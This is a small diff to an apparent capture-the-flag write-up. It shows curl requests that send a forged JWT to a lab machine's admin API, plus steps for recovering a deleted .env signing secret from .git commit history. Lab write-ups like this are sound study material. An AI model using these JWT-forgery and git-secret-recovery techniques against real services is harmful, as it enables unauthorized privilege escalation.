@@ -42,13 +42,13 @@ curl -X GET -H 'Content-Type: application/json' -H 'auth-token: eyJhbGciOiJIUzI1
 ```
 and response is `{"role":{"role":"you are normal user","desc":"testuser"}}`
 
-Try login with forged JWT token with TOKEN_SECRET=secret
+Try login with forged JWT token with `TOKEN_SECRET=secret`
 ```
 curl -X GET -H 'Content-Type: application/json' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjNmMDE2NDA4MGE4MjA0NWFiNWVjZjMiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InRlc3R1c2VyQGRhc2l0aC53b3JrcyIsImlhdCI6MTY0ODI5NjM4M30.DTKfqkj0GUAI46OLUGTwoOnBEgbQ0PkWk9pVMUz95g4' -i 'http://10.10.11.120/api/priv'
 ```
 But rejected
 
-Look in `.git` and find file `logs/HEAD' with commit history and a commit with description `commit: removed .env for security reasons`
+Look in `.git` and find file `logs/HEAD` with commit history and a commit with description `commit: removed .env for security reasons`
 Go back to that commit with:
 
 and login
